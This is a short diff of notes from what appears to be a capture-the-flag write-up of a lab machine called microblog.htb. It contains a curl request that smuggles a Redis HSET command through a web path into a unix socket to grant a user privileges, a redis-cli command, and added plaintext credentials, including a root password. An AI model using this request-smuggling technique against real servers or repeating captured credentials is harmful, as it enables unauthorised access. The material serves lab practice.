@@ -38,6 +38,8 @@ we can see a subdomaine sunny that have edit
 curl -X HSET http://microblog.htb/static/unix:%2Fvar%2Frun%2Fredis%2Fredis.sock:mateor%20pro%20true%20/HTTP/1.1 
 
 redis-cli -s /var/run/redis/redis.sock
+cooper.dooper
+
 cooper:zooperdoopercooper
 
-
+root:unCR4ckaBL3Pa$$w0rd
